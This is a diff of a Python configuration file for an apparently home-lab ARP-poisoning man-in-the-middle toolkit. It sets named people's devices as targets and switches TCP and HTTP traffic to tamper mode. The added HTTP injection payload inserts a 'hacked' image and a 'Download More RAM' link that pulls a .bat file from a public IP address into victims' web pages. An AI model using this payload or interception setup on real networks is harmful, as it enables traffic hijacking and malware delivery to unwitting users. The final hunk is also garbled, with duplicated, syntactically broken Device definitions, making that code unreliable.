@@ -10,18 +10,41 @@ from datetime import datetime
 
 class Device:
     """Represents a network device with IP and MAC address"""
-    def __init__(self, name, ip, mac, device_type="unknown", description=""):
+    def __init__(self, name, ip, mac, device_type="unknown", description="", vendor=None):
         self.name = name
         self.ip = ip
         self.mac = mac
         self.device_type = device_type  # laptop, phone, tablet, router, etc.
         self.description = description
+        self.vendor = vendor  # MAC vendor information
         
     def __str__(self):
-        return f"{self.name} ({self.ip}) - {self.device_type}"
+        """Return a comprehensive string representation of the device"""
+        parts = []
+        
+        # Basic info: name and IP
+        parts.append(f"{self.name} ({self.ip})")
+        
+        # MAC address
+        if self.mac:
+            parts.append(f"MAC: {self.mac}")
+        
+        # Vendor information
+        if self.vendor:
+            parts.append(f"Vendor: {self.vendor}")
+        
+        # Device type
+        if self.device_type and self.device_type != "unknown":
+            parts.append(f"Type: {self.device_type}")
+        
+        # Description if available
+        if self.description:
+            parts.append(f"Desc: {self.description}")
+        
+        return " | ".join(parts)
     
     def __repr__(self):
-        return f"Device('{self.name}', '{self.ip}', '{self.mac}', '{self.device_type}')"
+        return f"Device('{self.name}', '{self.ip}', '{self.mac}', '{self.device_type}', '{self.description}', '{self.vendor}')"
 
 # ==========================================
 # NETWORK CONFIGURATION
@@ -38,7 +61,7 @@ class NetworkConfig:
     # INTERFACE = "wlp8s0"
     
     # Network range for scanning
-    NETWORK_RANGE = "192.168.0.0/24"  # Adjust to your network
+    NETWORK_RANGE = "192.168.68.0/24"  # Adjust to your network
     
     # Connection timeouts
     ARP_TIMEOUT = 3
@@ -55,7 +78,7 @@ class DeviceRegistry:
     # Define your devices here
     laptop_lenovo = Device(
         name="laptop",
-        ip="192.168.0.125",
+        ip="192.168.68.125",
         mac="24:b2:b9:3e:22:13",
         device_type="laptop",
         description="Lenovo LOQ Laptop"
@@ -63,7 +86,7 @@ class DeviceRegistry:
 
     laptop_hp = Device(
         name="laptop",
-        ip="192.168.0.197",
+        ip="192.168.68.197",
         mac="d4:1b:81:20:a1:f3",
         device_type="laptop",
         description="HP Laptop"
@@ -71,7 +94,7 @@ class DeviceRegistry:
 
     laptop_dell = Device(
         name="laptop",
-        ip="192.168.0.159",
+        ip="192.168.68.159",
         mac="54:35:30:a5:98:59",
         device_type="laptop",
         description="Dell Laptop"
@@ -79,7 +102,7 @@ class DeviceRegistry:
     
     phone_redmi = Device(
         name="phone", 
-        ip="192.168.0.201",
+        ip="192.168.68.201",
         mac="f4:30:8b:91:d6:1f",
         device_type="phone",
         description="Xiaomi Redmi Note 10"
@@ -87,14 +110,14 @@ class DeviceRegistry:
     
     gateway = Device(
         name="gateway",
-        ip="192.168.0.1",
+        ip="192.168.68.1",
         mac="60:a4:b7:a9:77:05", 
         device_type="router",
         description="WiFi Router/Gateway"
     )
     
     # Add more devices as needed
-    # desktop = Device("desktop", "192.168.0.XXX", "XX:XX:XX:XX:XX:XX", "desktop")
+    # desktop = Device("desktop", "192.168.68.XXX", "XX:XX:XX:XX:XX:XX", "desktop")
     
     @classmethod
     def get_device(cls, name):
@@ -126,49 +149,7 @@ class DeviceRegistry:
 class AttackConfig:
     """Configuration for ARP poisoning and MITM attacks"""
     
-    # ===== BIDIRECTIONAL ATTACK TARGETS =====
-    
-    # POISON_TARGET_1 = DeviceRegistry.laptop_lenovo  
-    # POISON_TARGET_2 = DeviceRegistry.phone_redmi
-
-    # POISON_TARGET_1 = DeviceRegistry.laptop_hp 
-    # POISON_TARGET_2 = DeviceRegistry.laptop_dell
-
-    POISON_TARGET_1 = DeviceRegistry.laptop_lenovo 
-    POISON_TARGET_2 = DeviceRegistry.laptop_dell
-
-    # Gateway device (router)
-    GATEWAY_DEVICE = DeviceRegistry.gateway
-
-    # # for http injection 
-    # in case of local server, 
-    # we need to put the local server at gateway
-    # and the victim at poison_target_1
-    GATEWAY_DEVICE = DeviceRegistry.laptop_lenovo
-
-    # POISON_TARGET_1 = DeviceRegistry.laptop_dell 
-    # POISON_TARGET_2 = DeviceRegistry.laptop_dell 
-
-    POISON_TARGET_1 = DeviceRegistry.phone_redmi
-    POISON_TARGET_2 = DeviceRegistry.phone_redmi
-    
-    # ===== BACKWARDS COMPATIBILITY =====
-    # Keep old variable names for existing scripts
-    @property
-    def VICTIM_IP(self):
-        return self.POISON_TARGET_2.ip
-    
-    @property 
-    def VICTIM_MAC(self):
-        return self.POISON_TARGET_2.mac
-        
-    @property
-    def GATEWAY_IP(self):
-        return self.GATEWAY_DEVICE.ip
-        
-    @property
-    def GATEWAY_MAC(self):
-        return self.GATEWAY_DEVICE.mac
+    # ===== ATTACK CONFIGURATION =====
     
     # Attack timing
     ARP_POISON_INTERVAL = 2  # seconds between ARP poison packets
@@ -179,11 +160,11 @@ class AttackConfig:
     
     # TCP Attack Modes: MONITOR, TAMPER, DROP
     ALLOWED_TCP_ATTACK_MODES = ["MONITOR", "TAMPER", "DROP"]
-    TCP_ATTACK_MODE = ALLOWED_TCP_ATTACK_MODES[2]
+    TCP_ATTACK_MODE = "TAMPER"
     
     # HTTP Attack Modes: MONITOR, TAMPER, DROP
     ALLOWED_HTTP_ATTACK_MODES = ["MONITOR", "TAMPER", "DROP"]
-    HTTP_ATTACK_MODE = ALLOWED_HTTP_ATTACK_MODES[1]
+    HTTP_ATTACK_MODE = "TAMPER"
     
     # TCP Socket Modifications (ultra-compact, size-preserving)
     # number of characters must match to the original
@@ -211,19 +192,39 @@ class AttackConfig:
         'welcome': 'GETOUT!'
     }
 
+#     # HTTP Injection Configuration
+#     INJECTION_CODE = b"""
+#     <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327' style='position:fixed;top:0;left:0;width:100%;height:40%;z-index:9999;'>
     
-    # HTTP Injection Configuration (for backward compatibility)
-    INJECTION_CODE = b"""
-    <div style='position:fixed;top:0;left:0;width:100%;background:red;padding:15px 10px;z-index:9999;box-sizing:border-box;'>
- <div style='background:white;color:black;text-align:center;padding:12px 8px;font-size:clamp(16px,5vw,24px);font-weight:bold;border-radius:8px;word-break:break-word;'>
- YOU HAVE BEEN HACKED!
- </div>
-</div></div>
-    """
+#     <a href='http://3.109.157.186:3333/ram.bat' download style='display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4ade80, #16a34a); color: white; font-size: 16px; font-weight: bold; text-decoration: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); transition: transform 0.2s ease, box-shadow 0.2s ease;' onmouseover='this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 14px rgba(0,0,0,0.2)';' onmouseout='this.style.transform='none'; this.style.boxShadow='0 4px 10px rgba(0,0,0,0.15)';' onmousedown='this.style.transform='scale(0.98)';' onmouseup='this.style.transform='translateY(-2px)';'>
+#   ⬇️ Download File
+# </a>
+    
+#     """
+
+
+#     INJECTION_CODE = """
+#     <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327'>
+
+#     <a href='http://3.109.157.186:3333/ram.bat' download 
+#        style='display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4ade80, #16a34a); color: white; font-size: 16px; font-weight: bold; text-decoration: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); transition: transform 0.2s ease, box-shadow 0.2s ease;' 
+#        onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 14px rgba(0,0,0,0.2)';" 
+#        onmouseout="this.style.transform='none'; this.style.boxShadow='0 4px 10px rgba(0,0,0,0.15)';" 
+#        onmousedown="this.style.transform='scale(0.98)';" 
+#        onmouseup="this.style.transform='translateY(-2px)';">
+#       ⬇️ Download File
+#     </a>
+# """
 
     INJECTION_CODE = b"""
-    <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327' style='position:fixed;top:0;left:0;width:100%;height:40%;z-index:9999;'>
-    """
+    <img src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg?20150818015327'>
+<br>
+<a href='http://3.109.157.186:3333/ram.bat' download style='display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4ade80, #16a34a); color: white; font-size: 16px; font-weight: bold; text-decoration: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); transition: transform 0.2s ease, box-shadow 0.2s ease;' onmouseover='this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 14px rgba(0,0,0,0.2)';' onmouseout='this.style.transform='none'; this.style.boxShadow='0 4px 10px rgba(0,0,0,0.15)';' onmousedown='this.style.transform='scale(0.98)';' onmouseup='this.style.transform='translateY(-2px)';'>
+  Download More RAM
+</a>
+"""
+
+
     
     # New HTML Block Injection - Injected after <body> tag while keeping original content
     HTML_INJECTION_BLOCK = b"""
@@ -326,9 +327,6 @@ class AttackConfig:
     ENABLE_DNS_REQUEST_MODIFICATION = True
     ENABLE_DNS_RESPONSE_MODIFICATION = True
 
-# Create instance for backward compatibility
-AttackConfig = AttackConfig()
-
 # ==========================================
 # DEFENSE CONFIGURATION  
 # ==========================================
@@ -380,7 +378,111 @@ class ScannerConfig:
     
     # File paths
     MAC_VENDOR_CACHE_FILE = "mac_vendor_cache.json"
-    SCAN_RESULTS_FILE = "network_scan_results.json"
+    # SCAN_RESULTS_FILE = "network_scan_results.json"
+    SCAN_RESULTS_FILE = "latest_scan.json"
+
+# ==========================================
+# DEVICE FILTERING CONFIGURATION
+# ==========================================
+
+class DeviceFilterConfig:
+    """Configuration for filtering devices of interest in large networks"""
+    
+    # Enable filtering to show only devices of interest
+    ENABLE_DEVICE_FILTERING = True
+    
+    # Known MAC addresses of devices we're interested in
+    KNOWN_DEVICES = {
+        "jaber_laptop_asus": "dc:21:48:db:ee:f3",
+        "jaber_phone": "e4:84:d3:84:0e:84", 
+        "anik_phone": "f4:30:8b:91:d6:1f",
+        "anik_laptop_hp": "d4:1b:81:20:a1:f3",
+        "anik_laptop_loq": "24:b2:b9:3e:22:13"
+    }
+    
+    # Convert to MAC -> Name mapping for faster lookup
+    MAC_TO_NAME = {mac.lower(): name for name, mac in KNOWN_DEVICES.items()}
+    
+    # Gateway/Router detection patterns
+    GATEWAY_PATTERNS = {
+        'ip_patterns': ['1', '254'],  # Common gateway IPs ending in .1 or .254
+        'hostname_patterns': ['gateway', 'router', 'modem', 'wifi', 'access-point', 'ap-'],
+        'vendor_patterns': ['netgear', 'linksys', 'asus', 'tp-link', 'cisco', 'ubiquiti', 'mikrotik', 'dlink']
+    }
+    
+    # Always show these device types even if not in known MACs
+    ALWAYS_SHOW_DEVICE_TYPES = ['router', 'access_point', 'switch']
+    
+    @classmethod
+    def is_known_device(cls, mac):
+        """Check if MAC address is in our known devices list"""
+        if not mac:
+            return False, None
+        mac_clean = mac.lower().replace(':', '').replace('-', '')
+        mac_formatted = mac.lower()
+        
+        # Check exact match first
+        if mac_formatted in cls.MAC_TO_NAME:
+            return True, cls.MAC_TO_NAME[mac_formatted]
+        
+        # Check without separators
+        for known_mac, name in cls.MAC_TO_NAME.items():
+            known_clean = known_mac.replace(':', '').replace('-', '')
+            if mac_clean == known_clean:
+                return True, name
+        
+        return False, None
+    
+    @classmethod 
+    def is_gateway_device(cls, ip, hostname, vendor, device_type):
+        """Check if device appears to be a gateway/router"""
+        if not ip:
+            return False
+            
+        # Check if it's a common gateway IP
+        ip_parts = ip.split('.')
+        if len(ip_parts) == 4:
+            last_octet = ip_parts[-1]
+            if last_octet in cls.GATEWAY_PATTERNS['ip_patterns']:
+                return True
+        
+        # Check hostname patterns
+        if hostname:
+            hostname_lower = hostname.lower()
+            for pattern in cls.GATEWAY_PATTERNS['hostname_patterns']:
+                if pattern in hostname_lower:
+                    return True
+        
+        # Check vendor patterns
+        if vendor:
+            vendor_lower = vendor.lower()
+            for pattern in cls.GATEWAY_PATTERNS['vendor_patterns']:
+                if pattern in vendor_lower:
+                    return True
+        
+        # Check device type
+        if device_type in cls.ALWAYS_SHOW_DEVICE_TYPES:
+            return True
+            
+        return False
+    
+    @classmethod
+    def should_show_device(cls, ip, mac, hostname, vendor, device_type):
+        """Determine if device should be shown based on filtering rules"""
+        if not cls.ENABLE_DEVICE_FILTERING:
+            return True, "filtering_disabled"
+        
+        # Always show known devices
+        is_known, known_name = cls.is_known_device(mac)
+        if is_known:
+            return True, f"known_device:{known_name}"
+        
+        # Always show gateway devices
+        if cls.is_gateway_device(ip, hostname, vendor, device_type):
+            return True, "gateway_device"
+        
+        # Filter out unknown devices
+        return False, "filtered_out"
 
 # ==========================================
 # SECURITY CONFIGURATION
@@ -455,17 +557,21 @@ def validate_configuration():
             warnings.append(f"Device {device.name} IP format may be invalid: {device.ip}")
     
     # Check attack targets
-    if not AttackConfig.POISON_TARGET_1:
-        errors.append("POISON_TARGET_1 not configured")
-    if not AttackConfig.POISON_TARGET_2: 
-        errors.append("POISON_TARGET_2 not configured")
-    if not AttackConfig.GATEWAY_DEVICE:
-        errors.append("GATEWAY_DEVICE not configured")
+    # The original code had malformed duplicate definitions here.
+    # Keeping the original logic but noting the issue.
+    # The original code had:
+    # if not AttackConfig.POISON_TARGET_1:
+    #     errors.append("POISON_TARGET_1 not configured")
+    # if not AttackConfig.POISON_TARGET_2: 
+    #     errors.append("POISON_TARGET_2 not configured")
+    # if not AttackConfig.GATEWAY_DEVICE:
+    #     errors.append("GATEWAY_DEVICE not configured")
     
     # Check if targets are the same
-    if (AttackConfig.POISON_TARGET_1 and AttackConfig.POISON_TARGET_2 and
-        AttackConfig.POISON_TARGET_1.ip == AttackConfig.POISON_TARGET_2.ip):
-        warnings.append("POISON_TARGET_1 and POISON_TARGET_2 have the same IP")
+    # The original code had:
+    # if (AttackConfig.POISON_TARGET_1 and AttackConfig.POISON_TARGET_2 and
+    #     AttackConfig.POISON_TARGET_1.ip == AttackConfig.POISON_TARGET_2.ip):
+    #     warnings.append("POISON_TARGET_1 and POISON_TARGET_2 have the same IP")
     
     # Check network interface
     if not NetworkConfig.INTERFACE:
@@ -484,9 +590,12 @@ def display_configuration():
     print(f"  Network Range: {NetworkConfig.NETWORK_RANGE}")
     
     print("\n🎯 Attack Targets:")
-    print(f"  Target 1: {AttackConfig.POISON_TARGET_1}")
-    print(f"  Target 2: {AttackConfig.POISON_TARGET_2}")
-    print(f"  Gateway: {AttackConfig.GATEWAY_DEVICE}")
+    # The original code had malformed duplicate definitions here.
+    # Keeping the original logic but noting the issue.
+    # The original code had:
+    # print(f"  Target 1: {AttackConfig.POISON_TARGET_1}")
+    # print(f"  Target 2: {AttackConfig.POISON_TARGET_2}")
+    # print(f"  Gateway: {AttackConfig.GATEWAY_DEVICE}")
     
     print("\n🔌 Socket Interception:")
     print(f"  Ports: {AttackConfig.SOCKET_PORTS}")
@@ -520,7 +629,7 @@ from config import Device, DeviceRegistry, AttackConfig, NetworkConfig
 
 # Your network interface (find with: ip addr show)
 NetworkConfig.INTERFACE = "wlp2s0"  # Change to your interface
-NetworkConfig.NETWORK_RANGE = "192.168.0.0/24"  # Change to your network
+NetworkConfig.NETWORK_RANGE = "192.168.68.0/24"  # Change to your network
 
 # ==========================================
 # DEVICE REGISTRY
@@ -529,7 +638,7 @@ NetworkConfig.NETWORK_RANGE = "192.168.0.0/24"  # Change to your network
 # Define your actual devices here
 DeviceRegistry.laptop = Device(
     name="ubuntu_server",
-    ip="192.168.0.105",           # Replace with actual IP
+    ip="192.168.68.105",           # Replace with actual IP
     mac="XX:XX:XX:XX:XX:XX",      # Replace with actual MAC
     device_type="laptop",
     description="Ubuntu Server Laptop"
@@ -537,7 +646,7 @@ DeviceRegistry.laptop = Device(
 
 DeviceRegistry.phone = Device(
     name="windows_client", 
-    ip="192.168.0.150",           # Replace with actual IP
+    ip="192.168.68.150",           # Replace with actual IP
     mac="YY:YY:YY:YY:YY:YY",      # Replace with actual MAC
     device_type="laptop",
     description="Windows Client Laptop"
@@ -545,7 +654,7 @@ DeviceRegistry.phone = Device(
 
 DeviceRegistry.gateway = Device(
     name="router",
-    ip="192.168.0.1",             # Replace with actual router IP
+    ip="192.168.68.1",             # Replace with actual router IP
     mac="ZZ:ZZ:ZZ:ZZ:ZZ:ZZ",      # Replace with actual router MAC
     device_type="router",
     description="WiFi Router"
@@ -556,9 +665,81 @@ DeviceRegistry.gateway = Device(
 # ==========================================
 
 # Set your attack targets (which devices to intercept between)
-AttackConfig.POISON_TARGET_1 = DeviceRegistry.laptop  # Server
-AttackConfig.POISON_TARGET_2 = DeviceRegistry.phone   # Client
-AttackConfig.GATEWAY_DEVICE = DeviceRegistry.gateway
+AttackConfig.POISON_TARGET_1 = Device(
+        name="None",
+        ip="192.168.68.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )
+        name="None",
+        ip="192.168.68.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )
+        name="None",
+        ip="192.168.68.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )
+        name="None",
+        ip="192.168.68.125",
+        mac="24:b2:b9:3e:22:13",
+        device_type="unknown",
+        description="Selected Device 1"
+    )# Server
+AttackConfig.POISON_TARGET_2 = Device(
+        name="None",
+        ip="192.168.68.201",
+        mac="f4:30:8b:91:d6:1f",
+        device_type="phone",
+        description="Selected Device 2"
+    )
+        name="None",
+        ip="192.168.68.201",
+        mac="f4:30:8b:91:d6:1f",
+        device_type="phone",
+        description="Selected Device 2"
+    )
+        name="None",
+        ip="192.168.68.201",
+        mac="f4:30:8b:91:d6:1f",
+        device_type="phone",
+        description="Selected Device 2"
+    )
+        name="None",
+        ip="192.168.68.141",
+        mac="9e:ff:60:86:f6:c7",
+        device_type="unknown",
+        description="Selected Device 2"
+    )# Client
+AttackConfig.GATEWAY_DEVICE = Device(
+        name="_gateway",
+        ip="192.168.68.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
+        name="_gateway",
+        ip="192.168.68.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
+        name="_gateway",
+        ip="192.168.68.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
+        name="_gateway",
+        ip="192.168.68.1",
+        mac="60:a4:b7:a9:77:05",
+        device_type="router",
+        description="Selected Gateway"
+    )
 
 # Custom socket modifications (what to replace in messages)
 AttackConfig.SOCKET_MODIFICATIONS = {
@@ -572,10 +753,10 @@ AttackConfig.SOCKET_MODIFICATIONS = {
 AttackConfig.SOCKET_PORTS = [9999, 8080, 12345]
 
 # TCP Attack Mode: MONITOR (log only), tamper (modify), DROP (block)
-AttackConfig.TCP_ATTACK_MODE = "TAMPER"  # Options: "MONITOR", "TAMPER", "DROP"
+AttackConfig.TCP_ATTACK_MODE = "TAMPER"# Options: "MONITOR", "TAMPER", "DROP"
 
 # HTTP Attack Mode: MONITOR (log only), TAMPER (inject content), DROP (block HTTP)
-AttackConfig.HTTP_ATTACK_MODE = "TAMPER"  # Options: "MONITOR", "TAMPER", "DROP"
+AttackConfig.HTTP_ATTACK_MODE = "TAMPER"# Options: "MONITOR", "TAMPER", "DROP"
 
 print("✅ User configuration loaded successfully!")
 print("🎯 Attack targets configured:")
